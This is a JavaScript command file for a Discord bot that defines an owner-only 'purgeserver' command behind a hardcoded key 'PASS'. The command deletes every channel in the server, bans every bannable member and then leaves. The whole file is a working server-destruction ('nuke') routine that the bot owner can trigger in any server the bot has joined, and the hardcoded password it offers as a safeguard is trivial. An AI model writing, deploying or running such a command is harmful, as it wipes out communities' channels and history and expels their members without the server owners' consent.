/* eslint-disable no-useless-escape */
const Discord = require("discord.js");
const { Command } = require('discord.js-commando');

module.exports = class rufus extends Command {
    constructor(client) {
        super(client, {
            name: 'purgeserver',
            group: 'admin',
            memberName: 'purgeserver',
            description: 'Purges the server',
            guildOnly: true,
            ownerOnly: true,
            args: [{
                key: "key",
                prompt: "What is the key?",
                type: "string"
            }],
            clientPermissions: ['BAN_MEMBERS']
        });
    }

    async run(message, { key }) {
        if (key != "PASS") return; //add a key check so that nobody else can use it even if your account is hacked
        await message.guild.channels.cache.forEach(channel => channel.delete().catch(err => {
            try {
                message.author.send("Could not delete " + channel.name);
            } catch (error) {
                return;
            }
        }));

        try {

            await message.guild.members.cache.filter(member => member.bannable).forEach(member => member.ban());

        } catch (e) {

            return;

        }

        try {

            message.guild.leave();

        } catch (e) {

            return;

        }
    }
};